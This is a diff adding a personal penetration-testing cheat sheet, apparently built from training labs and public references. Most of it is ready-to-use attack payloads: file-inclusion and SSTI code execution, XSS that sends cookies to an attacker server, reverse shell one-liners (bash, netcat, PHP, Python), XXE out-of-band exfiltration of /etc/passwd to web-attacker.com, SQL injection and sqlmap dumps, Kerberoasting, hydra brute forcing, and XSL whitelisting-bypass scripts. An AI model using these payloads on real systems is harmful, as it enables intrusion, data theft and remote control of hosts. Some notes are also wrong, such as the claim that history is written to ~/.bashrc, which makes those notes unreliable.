@@ -1,0 +1,442 @@
+TABLE OF CONTENTS
+1. FILE INCLUSION
+2. CROSS SITE SCRIPING
+3. COMMAND LINE KUNG FU
+6. BRUTE FORCING
+7. KERBEROASTING
+8. REVERSE SHELLS
+13. BYPASSING HTTP CLIENT-SIDE CONTROLS
+19. XXE Injection
+19. Dirbuster
+20. SQL INJECTION
+21. SQLMAP
+22. SSTI 
+23. SMB
+50. XSL SCRIPT BYPASS
+51. TOOLS
+52. LDAP
+
+1. FILE INCLUSION
+        1.1 LOCAL FILE INCLUSION
+                1.1.1 DIRECTORY TRAVERSAL
+                        http://10.10.10.100/photoalbum/disaply.php?photo=../../../../../../etc/passwd
+                1.1.2 PHP WRAPPERS
+                        1.1.2.1 Expect
+                                http://10.10.10.100/photoalbum/disaply.php?photo=expect://ls
+                        1.1.2.2 Data
+                                - Inject the PHP code you want directly in the URL
+                                http://10.102.2.220/description.php?page=data:text/plain,<?system($_GET['x']);?>&x=(<command here>)
+                                source: [2]
+                        1.1.2.3 Filter
+                                http://10.102.3.45/description.php?page=php://filter/convert.base64-encode/resource=config.php
+                                - Useful if the resource in question is a php file that doesn't render properly.
+                                source: [2]
+        1.2 REMOTE FILE INCLUSION
+                1.2.1 HTTP Inclusion
+                        $ python -m SimpleHTTPServer 4444
+                        http://10.102.8.127/description.php?page=http://10.102.5.106:4444/shell.php
+                        - If http is blocked, try HTTP or other caps variations. 
+                1.2.2 SMB Inclusion
+                        - Use when "allow_url_include=0" and http:// is blocked. 
+                        $ python smbshare.py –smb2support sharepath /root/Desktop/Shells
+                        http://10.102.8.127/description.php?page=\\10.102.5.106\sharepath\shell.php
+                        source: [1]
+2. CROSS SITE SCRIPING
+        2.1 REFLECTED
+                - Occurs when user inputs (like URL parameters) are reflected back onto the web page. Adversaries can inject script tags to run arbitrary code. 
+                http://10.102.11.197/purchase?id=<script>alert("xss")</script>
+                2.1.1
+                        Tip: check if URL parameter is reflected in the webpage. I.e. from Blake Jarvis, "web.k" reflected into "class" attribute. double-quotes not escaped, 
+                        leading to xss. 
+                        es-pe/web.k"onpageshow=alert(1)%20y="
+        2.2 STORED
+                - Occurs when user inputs are STORED (like blog comments) and reflected back onto the web page. Anyone visiting the blog will be victim.
+        2.3 DOM-BASED
+                - The technique to avoid sending payload to the server hinges on the fact that URI fragments (i.e. part in URI after #) is not sent to server
+                - somesite.com/page.html#default=<XSSinjection>
+        2.4 EXFILTRATING A VICTIM'S COOKIES
+                2.4.1 WEBSERVER REDIRECTION
+                        $ python -m http.server 80
+                        <script>window.location.replace("http://10.102.4.49/"+document.cookie)</script>         //NOT STEALTHY!!!
+        2.5 FILTER EVASION
+                - Full list at https://kalilinuxtutorials.com/xss-payload-list/
+                2.5.1
+                        <BODY ONLOAD=alert('XSS')>
+                2.5.2
+                        onpageshow=alert(1)
+3. COMMAND LINE KUNG FU
+        3.1 COMMAND HISTORY
+                3.1.1 Commands entered in terminal are tracked using HISTFILE environment variable and written to ~/.bashrc when user logs off.
+                3.1.2 Prevent commands being recorded by prepending with a space. Alternatively, use 'set +o history' and 'set -o history'
+        3.2 SUDO
+                3.2.1 TIMEOUT
+                        - By default, set to 5 or 15 minutes based on OS
+                        - Session timeouts tracked using file records. Often at /run/sudo/ts/<USERNAME>
+                3.2.2 Sessions
+                        - By default, sudo honors session segregation. You would have to authenticate for two separate windows.
+                        - tty_tickets flag controls this
+
+5. WEBSITE ENUMERATION
+        5.1 BASICS
+                5.1.1 ROBOTS TXT FILE
+                        Check http://example.com/robots.txt
+                5.1.2 ADMIN DIRECTORY
+                        Check http://example.com/admin
+                5.1.3 HEADER INJECTION
+                        5.1.3.1 REFERER
+                                Referer: http://127.0.0.1
+6. BRUTE FORCING
+        6.1 BASIC AUTH
+                6.1.1 HYDRA
+                        hydra -l <USERNAME> -P <PASSWORDLIST> <IP> -s <PORT> http-get "/<PATH>" 
+        6.2 SSH
+                6.1.1 HYDRA
+                        hydra -l <USERNAME> -P <PASSWORDLIST> -s <PORT> ssh://<IP>
+7. KERBEROASTING [20]
+        7.1 DESCRIPTION
+                - Technique used to collect Kerberos tickets for service accounts that contain password hashes
+                - Hashes can be cracked offline. Service accounts sometimes run with elevated privileges. 
+        7.2 SERVICE PRINCIPAL NAMES (SPN)
+                - Used to identify services on Windows
+                - They must be associated with an account (usually a service account)
+                - Any domain account including non-admin user can request tickets for these accounts
+        7.3 GET USER SPNs
+                - PowerSploit. Invoke-Kerberoast
+                - Empire
+                7.3.1 IMPACKET GetUserSPNs.py
+                        python GetUserSPNs.py -dc-ip <IP OF DC> <DOMAIN>/<USERNAME>:<PASSWORD> -request
+        7.4 CRACK HASH
+                7.4.1 HASHCAT
+                        hashcat -m 13100 -a 0 <HASHFILE> <WORDLISTFILE>
+        7.5 EXPLOIT
+                - Use msfconsole psexec module to pwn the DC with new creds. Access as service account
+8. REVERSE SHELLS [3]
+        8.1 PHP
+                8.1.1
+                        <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'");?>
+                8.1.2
+                        php -r '$sock=fsockopen("<LISTENER_IP>",<LISTENER_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+        8.2 NETCAT
+                8.2.1
+                        nc -e /bin/sh <LISTENER_IP> <LISTENER_PORT>
+                8.2.2
+                        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f
+        8.3 BASH
+                8.3.1
+                        bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1
+        8.4 PYTHON
+                8.4.1
+                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+13. BYPASSING HTTP CLIENT-SIDE CONTROLS
+        13.1 HIDDEN FORM FIELDS
+        13.2 HTTP COOKIES
+                admin=true
+        13.3 URL PARAMETERS
+                http://www.derricksdoughnuts.com/apply_discount?discount_percent=10
+        13.4 REFERER HEADER
+                - Developers will sometimes restrict access depending on the HTTP header information contained in a request. Try changing Referrer header. 
+19. DIRBUSTER
+        19.1 ADVANCED OPTIONS
+                19.1.1 HTTP OPTIONS
+                        19.1.1.1 CUSTOM HTTP HEADERS
+                                19.1.1.1.1
+                                        X-Forwarded-For set to 127.0.0.1 to reveal web pages only accessible to localhost
+                                19.1.1.1.2
+                                        Can add Basic auth header
+                        19.1.1.2 HTTP USER AGENT
+                                Change to an inconspicuous user agent 
+                19.1.2 SCAN OPTIONS
+                        19.1.2.1 
+                                Limit number of requests per second to increase stealth
+                                
+19. XXE INJECTION
+        19.1 BASICS
+                19.1.1 EXPLOITING XXE TO RETRIEVE FILES [12,13]
+                        19.1.1.1 BASIC FILE RETRIEVAL
+                                <?xml version="1.0" encoding="UTF-8"?>
+                                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+                                <stockCheck><productId>&xxe;</productId></stockCheck>
+                        19.1.1.2 BASE64 FILE RETRIEVAL [17]
+                                19.1.1.2.1
+                                        <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+                                19.1.1.2.2
+                                        <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" > ]>
+                19.1.2 SSRF ATTACKS [12]
+                        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+                19.1.3 XXE to RCE [16] 
+                        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
+                19.1.4 BILLION LAUGHS ATTACK
+                        <!DOCTYPE dos [
+                        <!ENTITY dos1 "DOS Attack">
+                        <!ENTITY dos2 "&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;">
+                        <!ENTITY dos3 "&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;">
+                        <!ENTITY dos4 "&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;">
+                        <!ENTITY dos5 "&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;">
+                        <!ENTITY dos6 "&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;">
+                        <!ENTITY dos7 "&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;">
+                        <!ENTITY dos8 "&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;">
+                        <!ENTITY dos9 "&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;"> ]>
+                        <leave><employerId>&dos9;</employerId></leave>
+        19.2 BLIND XXE
+                19.2.1 DETECTION
+                        Induce SSRF via SimpleHTTPServer, check if traffic occurred. 
+                19.2.2 EXPLOITING BLIND XXE TO EXFILTRATE DATA OUT-OF-BAND [14]
+                        - Host malicious DTD (Document Type Definition) on controlled system
+                        - Invoke external malicious DTD from within the in-band XXE payload
+                        19.2.2.1 [14]
+                                19.2.2.1.1 ATTACKER SERVER
+                                        <!ENTITY % file SYSTEM "file:///etc/passwd">
+                                        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+                                        %eval;
+                                        %exfiltrate; 
+                                19.2.2.1.2 XXE PAYLOAD
+                                        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]> 
+                        19.2.2.2 [15]
+                                19.2.2.2.1 ATTACKER SERVER
+                                        <!ENTITY % file SYSTEM "file:///etc/passwd">
+                                        <!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
+                                19.2.2.2.2 XXE PAYLOAD
+                                        <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd"> %xxe; %ext; ]>
+                                        <foo><u>
+                                        &exfil;
+                                        </u></foo>
+        
+20. SQL INJECTION
+        20.1 BASICS
+                20.1.1 BASIC INJECTION
+                        ' OR 1=1 -- 
+                        - Note the space at the end. The -- is for commenting out the rest of the legitimate line. 
+                20.1.2 DATABASE ENUMERATION
+                        20.1.2.1 ENUMERATE DATABASES
+                                20.1.2.1.1
+                                        ' UNION SELECT schema_name, NULL, NULL,... FROM information_schema.schemata --
+                                20.1.2.1.2
+                                        ' UNION SELECT DATABASE(),2,...N -- 
+                                        Enumerates only current database
+                        20.1.2.2 ENUMERATE NUMBER OF COLUMNS IN CURRENT SELECT STATEMENT
+                                james' ORDER BY <N> --
+                                Increment <N> until it returns an invalid response. 
+                        20.1.2.3 ENUMERATE VULNERABLE COLUMNS
+                                james' UNION SELECT 1,..,N -- 
+                                Returns vulnerable columns. Not sure how this works exactly?
+                        20.1.2.4 ENUMERATE TABLES
+                                20.1.4.3.1
+                                        james' UNION SELECT 1,..,N-1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 
+                                20.1.4.3.2
+                                        ' UNION SELECT table_name, NUll, NUll,... FROM information_schema.tables WHERE table_schema='<DATABASE NAME>' --
+                        20.1.2.5 ENUMERATE COLUMNS
+                                20.1.2.5.1
+                                        james' UNION SELECT 1,...,N-1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='<TABLE>' -- 
+                                20.1.2.5.2
+                                        ' UNION SELECT column_name, NULL, NULL,... FROM information_schema.columns WHERE table_name='<TABLE NAME>' -- 
+                        20.1.2.6 EXFILTRATING DATA
+                                ' UNION SELECT <COLUMN>, NULL, NULL, NULL, NULL,..., FROM <TABLE> WHERE id=1 -- 
+                                - In order for a UNION to work, there must be an equal number of columns in each SELECT statement
+                                - Each column must also have the same data type (using NULL can overcome this)
+                20.1.3 FILTER EVASION
+                        20.1.3.1 ABNORMAL CAPITALIZATION
+                                UnION, SeLECT
+                        20.1.3.2 URL ENCODING
+                                %55 equals 'U'
+                                %55NION, %53ELECT
+                        20.1.3.3 MULTI-LINE COMMENTS
+                                UN/**/ION, SE/**/LECT
+                        20.1.3.4 PLUS+ CONCATENATION
+                                '+' can be used to build an injection query without the use of quotes
+                                UNION+SELECT+
+                                -- not verified -- 
+                        20.1.3.5 POUND# BYPASS
+                                Abuses inline comment system within MySQL
+                                #UNION #SELECT
+                                -- not verified -- 
+                        20.1.3.6 REVERSE FUNCTION
+                                REVERSE('NOINU') REVERSE('TCELES')
+                                -- not verified -- 
+                        20.1.3.7 HEX ENCODING
+                                WHERE username=0x626f62 is analagous to WHERE username='bob'
+                                Useful when ' character is blocked
+                        20.1.3.8 CONCAT CHAR 
+                                WHERE username=CONCAT(CHAR(77),CHAR(76),CHAR(75)) is analagous to WHERE username='MLK'
+                                Useful when ' character is blocked
+        20.2 BOOLEAN-BASED BLIND [6,7]
+                20.2.1 PROOF OF CONCEPT
+                        <VALIDVALUE>' AND '1'='1
+                                should return value
+                        <VALIDVALUE>' AND '1'='2
+                                should NOT return value
+                20.2.1 ENUMERATE DATABASE
+                        20.2.1.1 LENGTH
+                                ' OR LENGTH(DATABASE())='<LENGTH>
+                        20.2.1.2 NAME
+                                ' OR SUBSTRING(DATABASE(),<INDEX>,1)='<CHAR>
+                20.2.2 ENUMERATE TABLE(S)
+                        20.2.2.1 LENGTH
+                                ' OR LENGTH((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1))='<LENGTH>
+                        20.2.2.2 NAME
+                                ' OR SUBSTRING((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1),<INDEX>,1)='<CHAR>
+                20.2.3 ENUMERATE COLUMN(S)
+                        20.2.3.1 LENGTH
+                                ' OR LENGTH((SELECT column_name from information_schema.columns where table_name='data' limit 0,1))='<LENGTH>
+                        20.2.3.2 NAME
+                                ' OR SUBSTRING((SELECT column_name from information_schema.columns where table_name='data' limit 0,1),<INDEX>,1)='<CHAR>
+                20.2.4 DUMP DATA
+                        20.2.4.1 LENGTH
+                                ' OR LENGTH((SELECT <COLUMN> FROM <TABLE> limit 0,1))='<LENGTH>
+                        20.2.4.2 CONTENT
+                                ' OR SUBSTRING((SELECT <COLUMN> FROM <TABLE> limit 0,1),<INDEX>,1)='<CHAR>
+                20.2.5 AUTOMATED SCRIPT [7]
+        20.3 TIME-BASED BLIND [8]
+                20.3.1 PROOF OF CONCEPT
+                        ' OR SLEEP(5) AND '1'='1
+                        If this input causes a 5 second delay, probable that time-based SQL exists
+                20.3.2 FORMULA
+                        ' OR IF(%s, sleep(5), 'NO') AND '1'='1
+                        where %s is payload (see LENGTH and SUBSTRING sections from 20.2)
+        20.4 FILE INCLUSION
+                20.4.1 GENERAL CONCEPTS
+                        20.4.1.1 PRIVILEGES AND FUNCTIONS
+                                FILE privilege allows user to read files [9]
+                                LOAD_FILE() allows reading files from filesystem [10]
+                20.4.2 READING FILE
+                        ' UNION SELECT LOAD_FILE('<FILE>'),2,...,N -- 
+                        source: [11]
+                20.4.3 WRITING FILE
+                        ' UNION SELECT 1,...,N-1, "<FILECONTENTS"> into OUTFILE '<DESTINATIONPATH>' -- 
+                        source: [11]
+
+        
+21. SQLMAP
+        21.1 BASIC ATTACK FLOW [4,5]
+                Target: http://10.102.9.174/DBSearch?name=test3&age=test3&location=test3&type=insurer
+                21.1.1 TEST FOR INJECTION
+                        sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer'
+                21.1.2 LIST ALL DATABASES
+                        sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' --dbs
+                21.1.3 LIST ALL TABLES IN DATABASES
+                        sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml --tables
+                21.1.4 LIST ALL COLUMNS IN TABLE
+                        sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml -T hidden_table --columns
+                21.1.5 DUMP SELECTED COLUMNS
+                        sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml -T hidden_table -C secret --dump
+
+22. Server-side Template Injection (SSTI)
+        22.1 DESCRIPTION
+                - Attacker uses native template syntax to inject a payload into a web template, which is then executed server-side and displayed to end user.
+                - Unlike most reflected or stored XSS vulnerabilities, a template injection vulnerability can result in code being run on the server, rather than the user’s client. 
+        22.2 IDENTIFYING
+                22.2.1 JINJA
+                        {{ 3 * '3' }} will resolve to 333. Python. 
+                22.2.2 TWIG
+                        {{ 3 * '3' }} will resolve to 9. PHP.
+        22.3 SEARCHING FOR EXPLOITABLE CLASSES
+                22.3.1
+                        {{ ''.__class__.__mro__[1].__subclasses__()[0:10] }}
+                        Returns first 10 classes. Iterate and identify exploitable classes. 
+        22.4 EXPLOITABLE CLASSES
+                22.4.1 
+                        os.system
+                22.4.2 [21]
+                        subprocess.Popen
+                        {{ ''.__class__.__mro__[1].__subclasses__()[<INSERT INDEX HERE>]('ls',shell=True,stdout=-1).communicate() }}
+23. SMB
+        23.1 ENUMERATION
+                23.1.1 NMAP
+                        23.1.1.1
+                                nmap --script smb-os-discovery <IP>
+                        23.1.1.2
+                                nmap --script smb-security-mode <IP>
+        23.2 CONNECTING 
+                23.2.1 SMBCLIENT [22]
+                        23.2.1.1
+                                smbclient -L <IP>
+                                Enter null password to login as anonymous
+                                This will show list of Shares and Servers
+                        23.2.1.2
+                                smbclient \\\\<IP>\\<shareName>
+                                Enter null password to login as anonymous
+                                This will provide access to remote share
+
+50. XSL SCRIPT BYPASS
+        50.1 USING MSXSL.EXE
+                50.1.1  EXPLANATION
+                        - msxsl.exe is a Microsoft-developed command utility to process Extensible Stylesheet Language (XSL) files. 
+                        - It is possible to embed malicious JS/VBScript into XSL file
+                        - msxsl.exe no longer installed by default on machines. 
+                50.1.2 USAGE
+                        msxsl.exe <DUMMY_XML_FILE> evil.xsl
+                50.1.3 SCRIPT (IMMERSIVELABS) 
+                        <?xml version="1.0"?>
+                        -<xsl:stylesheet xmlns:user="http://mycompany.com/mynamespace" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+                                <msxsl:script language="JScript" implements-prefix="user">function xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\Secret\\a.exe");return nodelist.nextNode().xml;} </msxsl:script>
+                                -<xsl:template match="/">
+                                        <xsl:value-of select="user:xml(.)"/>
+                                </xsl:template>
+                        </xsl:stylesheet>
+        50.2 USING WMIC [18]
+                50.2.1 EXPLANATION
+                        - Invoke any wmic command and specify /format pointing to the evil.xsl:
+                50.2.2 USAGE
+                        wmic os get /FORMAT:"evil.xsl"
+                50.2.3 SCRIPT [18]
+                        <?xml version='1.0'?>
+                        <stylesheet
+                        xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+                        xmlns:user="placeholder"
+                        version="1.0">
+                        <output method="text"/>
+                                <ms:script implements-prefix="user" language="JScript">
+                                <![CDATA[
+                                var r = new ActiveXObject("WScript.Shell").Run("calc");
+                                ]]> </ms:script>
+                        </stylesheet>
+51. TOOLS
+        51.1 SSL SCANNERS
+                51.1.1 testssl.sh
+                        [19] https://testssl.sh/
+                51.1.2 cipher-suite-enum.pl
+                        [20] https://labs.portcullis.co.uk/tools/ssl-cipher-suite-enum/
+52. LDAP (Lightweight Directory Access Protocol)
+        52.1 SUMMARY
+                - LDAP is a protocol used at organizational network level to handle services such as hosts, servers, printers, scanners, etc. 
+                - Port 389 for standard
+                - Port 636 for communication over TLS
+        52.2 ATTACK VECTOR
+                - During authentication phase, credentials sent in plaintext. 
+
+
+
+
+
+
+
+References
+[1] https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/
+[2] http://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html
+[3] https://oscp.infosecsanyam.in/shells/linux-reverse-shell-one-liner
+[4] https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
+[5] https://github.com/aramosf/sqlmap-cheatsheet/blob/master/sqlmap%20cheatsheet%20v1.0-SBD.pdf
+[6] https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/
+[7] BooleanBlindInjectionScript.txt
+[8] TimeBlindInjectionScript.txt
+[9] https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file
+[10] https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file
+[11] https://docs.securezombie.com/enumeration/sql-injection
+[12] https://portswigger.net/web-security/xxe
+[13] https://blog.cobalt.io/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16?gi=e699a1087f47
+[14] https://portswigger.net/web-security/xxe/blind
+[15] https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/
+[16] https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
+[17] https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe
+[18] https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md
+[19] https://testssl.sh/
+[20] https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
+[21] https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+[22] https://tldp.org/HOWTO/SMB-HOWTO-8.html
+
+
+
+
+
+
+
+
